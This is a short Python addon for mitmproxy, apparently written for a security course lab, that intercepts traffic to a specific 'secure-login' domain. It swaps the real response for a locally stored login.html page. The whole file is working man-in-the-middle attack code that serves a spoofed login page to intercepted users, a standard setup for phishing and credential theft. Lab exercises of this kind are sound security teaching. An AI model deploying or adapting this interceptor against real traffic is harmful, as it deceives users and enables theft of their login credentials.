from mitmproxy import ctx, http


with open("login.html") as f:
    html = f.read()


class Intercepter:
    def response(self, flow):
        if flow.request.pretty_url in ["http://tda602-secure-login.tk/", "https://tda602-secure-login.tk/"]:
            ctx.log.info("mitm")
            flow.response = http.HTTPResponse.make(
                200,
                html,
                {"Content-Type": "text/html"}
            )


addons = [
    Intercepter()
]
